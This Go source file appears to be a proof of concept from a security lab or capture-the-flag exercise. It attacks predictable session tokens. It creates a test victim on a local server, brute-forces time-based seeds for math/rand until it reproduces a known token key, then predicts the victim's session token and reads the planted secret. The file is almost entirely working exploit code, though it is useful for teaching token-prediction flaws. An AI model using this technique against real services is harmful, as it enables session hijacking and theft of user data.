package main

import (
	"1_session_generation/pkg/api"
	"1_session_generation/pkg/helper"
	"encoding/binary"
	"encoding/hex"
	"errors"
	log "github.com/sirupsen/logrus"
	"math/rand"
	"time"
)

func main() {
	err := Run("127.0.0.1")
	if err != nil {
		log.Error(err)
		return
	}
}

func Run(addr string) error {
	endpoints := helper.GetEndpoint(&addr)
	tokenKey, victimKey, err := CreateVictimForTest(endpoints)
	if err != nil {
		return err
	}

	now := time.Now()
	for i := time.Now().Add(-120 * time.Minute); !i.After(now); i = i.Add(time.Second) {
		err, done := TestSeed(i, endpoints, tokenKey, victimKey)
		if done {
			return err
		}
	}

	return errors.New("Something wrong")
}

func TestSeed(seed time.Time, endpoints helper.Endpoints, victimTokenKey string, victimKey string) (error, bool) {
	rand.Seed(seed.Unix())
	for i := 0; i < 10000; i++ {
		tokenKey := make([]byte, 8)
		binary.LittleEndian.PutUint64(tokenKey, rand.Uint64())
		if hex.EncodeToString(tokenKey) == victimTokenKey {
			log.Info("Found!")

			for true {
				token := make([]byte, 8)
				binary.LittleEndian.PutUint64(token, rand.Uint64())
				client := api.NewClient(endpoints.GetCPUrl(), victimKey, hex.EncodeToString(token))
				user, err := client.GetUser(victimKey)
				if err == nil {
					log.Info("Get secret :" + user.Description)
					return nil, true
				}
			}

			return nil, true
		}
	}
	return nil, false
}

func CreateVictimForTest(endpoints helper.Endpoints) (string, string, error) {
	tokenKey, _, err := helper.CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return "", "", err
	}
	victimKey, victimToken, err := helper.CreateUser(endpoints.GetWebUrl())
	client := api.NewClient(endpoints.GetCPUrl(), victimKey, victimToken)
	err = client.SetUserDescription(victimKey, "secret")
	if err != nil {
		return "", "", err
	}
	return tokenKey, victimKey, nil
}
